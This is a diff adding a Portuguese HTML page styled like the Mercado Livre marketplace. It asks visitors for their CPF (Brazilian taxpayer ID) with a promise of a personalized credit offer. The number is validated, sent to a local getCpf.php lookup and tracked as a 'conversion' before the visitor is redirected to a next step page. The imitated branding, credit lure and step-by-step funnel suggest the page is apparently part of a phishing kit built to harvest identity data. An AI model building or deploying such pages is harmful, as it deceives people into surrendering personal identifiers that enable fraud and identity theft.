@@ -1,0 +1,329 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <title>Análise de Perfil - mercado</title>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
+  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
+
+  <!-- TRACKER: adicione isso em TODAS as páginas -->
+  <script src="../js/tracker.js"></script>
+
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    body {
+      font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+      background: #EEEEEE;
+      min-height: 100vh;
+      color: #333333;
+      display: flex;
+      flex-direction: column;
+    }
+
+    .header {
+      background: #FFE600;
+      padding: 20px 24px;
+      box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+      text-align: center;
+    }
+
+    .logo-container img {
+      height: 50px;
+      width: auto;
+    }
+
+    .container {
+      max-width: 520px;
+      margin: 30px auto;
+      padding: 30px;
+      background: white;
+      border-radius: 8px;
+      box-shadow: 0 1px 2px rgba(0, 0, 0, 0.1);
+      flex: 1;
+    }
+
+    .title {
+      font-size: 22px;
+      font-weight: 600;
+      color: #333333;
+      margin-bottom: 12px;
+    }
+
+    .subtitle {
+      font-size: 14px;
+      color: #666666;
+      margin-bottom: 24px;
+      line-height: 1.5;
+    }
+
+    .form-group {
+      margin-bottom: 24px;
+    }
+
+    .form-label {
+      display: block;
+      font-size: 14px;
+      font-weight: 500;
+      color: #666666;
+      margin-bottom: 8px;
+    }
+
+    .form-input {
+      width: 100%;
+      padding: 12px;
+      border: 1px solid #ddd;
+      border-radius: 6px;
+      font-family: inherit;
+      font-size: 14px;
+      transition: all 0.2s;
+    }
+
+    .form-input:focus {
+      outline: none;
+      border-color: #3483FA;
+      box-shadow: 0 0 0 3px rgba(52, 131, 250, 0.1);
+    }
+
+    .form-input.error {
+      border-color: #e74c3c;
+      background-color: rgba(231, 76, 60, 0.05);
+    }
+
+    .error-text {
+      font-size: 12px;
+      color: #e74c3c;
+      margin-top: 6px;
+      display: none;
+    }
+
+    .error-text.show {
+      display: block;
+    }
+
+    .btn-submit {
+      width: 100%;
+      padding: 14px;
+      background: #3483FA;
+      color: white;
+      border: none;
+      border-radius: 6px;
+      font-size: 16px;
+      font-weight: 600;
+      cursor: pointer;
+      transition: all 0.2s;
+    }
+
+    .btn-submit:hover {
+      background: #2968C8;
+      transform: translateY(-2px);
+      box-shadow: 0 4px 12px rgba(52, 131, 250, 0.2);
+    }
+
+    .btn-submit:active {
+      transform: translateY(0);
+    }
+
+    .btn-submit:disabled {
+      background: #ccc;
+      cursor: not-allowed;
+      transform: none;
+    }
+
+    .loading-spinner {
+      display: none;
+      width: 16px;
+      height: 16px;
+      border: 2px solid rgba(255, 255, 255, 0.3);
+      border-top-color: white;
+      border-radius: 50%;
+      animation: spin 0.8s linear infinite;
+    }
+
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
+
+    .success-message {
+      background: #d4edda;
+      color: #155724;
+      padding: 12px;
+      border-radius: 6px;
+      margin-bottom: 16px;
+      display: none;
+    }
+
+    .success-message.show {
+      display: block;
+    }
+
+    @media (max-width: 480px) {
+      .container {
+        margin: 20px 16px;
+        padding: 20px;
+      }
+
+      .title {
+        font-size: 18px;
+      }
+    }
+  </style>
+</head>
+<body>
+  <div class="header">
+    <div class="logo-container">
+      <img src="logo.png" alt="Logo">
+    </div>
+  </div>
+
+  <div class="container">
+    <h1 class="title">Análise de Seu Perfil</h1>
+    <p class="subtitle">Vamos analisar seu CPF para gerar sua proposta personalizada de crédito.</p>
+
+    <div class="success-message" id="successMsg">
+      CPF encontrado com sucesso! Carregando próxima etapa...
+    </div>
+
+    <form id="cpfForm" onsubmit="handleSubmit(event)">
+      <div class="form-group">
+        <label class="form-label">CPF *</label>
+        <input
+          type="text"
+          id="cpf"
+          class="form-input"
+          placeholder="000.000.000-00"
+          maxlength="14"
+          required
+          autocomplete="off"
+          inputmode="numeric"
+        >
+        <div class="error-text" id="cpfError"></div>
+      </div>
+
+      <button type="submit" class="btn-submit" id="submitBtn">
+        <span id="btnText">Analisar CPF</span>
+        <div class="loading-spinner" id="spinner"></div>
+      </button>
+    </form>
+  </div>
+
+  <script>
+    // VALIDAÇÃO E RASTREAMENTO
+    const cpfInput = document.getElementById('cpf');
+    const form = document.getElementById('cpfForm');
+    const submitBtn = document.getElementById('submitBtn');
+    const cpfError = document.getElementById('cpfError');
+    const successMsg = document.getElementById('successMsg');
+
+    // Formatar CPF conforme digita
+    cpfInput.addEventListener('input', (e) => {
+      let value = e.target.value.replace(/\D/g, '');
+      if (value.length <= 11) {
+        value = value.replace(/(\d{3})(\d)/, '$1.$2');
+        value = value.replace(/(\d{3})(\d)/, '$1.$2');
+        value = value.replace(/(\d{3})(\d{1,2})$/, '$1-$2');
+        e.target.value = value;
+      }
+    });
+
+    // Validação em tempo real
+    cpfInput.addEventListener('blur', () => {
+      const cpf = cpfInput.value.replace(/\D/g, '');
+      const isValid = cpf.length === 11 && isValidCPF(cpf);
+
+      if (!isValid && cpf.length > 0) {
+        cpfInput.classList.add('error');
+        cpfError.textContent = 'CPF inválido';
+        cpfError.classList.add('show');
+
+        // RASTREAR erro de validação
+        Tracker.trackValidation('cpf', false);
+        Tracker.trackError('invalid_cpf', { length: cpf.length });
+      } else {
+        cpfInput.classList.remove('error');
+        cpfError.classList.remove('show');
+      }
+    });
+
+    function isValidCPF(cpf) {
+      if (cpf.length !== 11 || /^(\d)\1{10}$/.test(cpf)) return false;
+
+      let sum = 0;
+      let remainder;
+
+      for (let i = 1; i <= 9; i++) {
+        sum += parseInt(cpf.substring(i - 1, i)) * (11 - i);
+      }
+      remainder = (sum * 10) % 11;
+      if (remainder === 10 || remainder === 11) remainder = 0;
+      if (remainder !== parseInt(cpf.substring(9, 10))) return false;
+
+      sum = 0;
+      for (let i = 1; i <= 10; i++) {
+        sum += parseInt(cpf.substring(i - 1, i)) * (12 - i);
+      }
+      remainder = (sum * 10) % 11;
+      if (remainder === 10 || remainder === 11) remainder = 0;
+      if (remainder !== parseInt(cpf.substring(10, 11))) return false;
+
+      return true;
+    }
+
+    async function handleSubmit(e) {
+      e.preventDefault();
+
+      const cpf = cpfInput.value.replace(/\D/g, '');
+
+      if (!isValidCPF(cpf)) {
+        cpfInput.classList.add('error');
+        cpfError.textContent = 'CPF inválido';
+        cpfError.classList.add('show');
+        Tracker.trackError('cpf_submit_invalid', { cpf: cpf.substring(0, 3) });
+        return;
+      }
+
+      // Desabilitar botão
+      submitBtn.disabled = true;
+      document.getElementById('spinner').style.display = 'block';
+
+      try {
+        // Consultar API de CPF
+        const response = await fetch(`/api/getCpf.php?cpf=${cpf}`);
+        const data = await response.json();
+
+        if (data.success) {
+          // RASTREAR conversão bem-sucedida
+          Tracker.trackConversion();
+
+          // Mostrar mensagem de sucesso
+          successMsg.classList.add('show');
+
+          // Redirecionar pra próxima etapa após 1.5s
+          setTimeout(() => {
+            window.location.href = '3.html';
+          }, 1500);
+        } else {
+          throw new Error(data.erro || 'CPF não encontrado');
+        }
+      } catch (error) {
+        // RASTREAR erro da API
+        Tracker.trackError('cpf_api_error', {
+          message: error.message
+        });
+
+        cpfInput.classList.add('error');
+        cpfError.textContent = error.message;
+        cpfError.classList.add('show');
+
+        submitBtn.disabled = false;
+        document.getElementById('spinner').style.display = 'none';
+      }
+    }
+  </script>
+</body>
+</html>
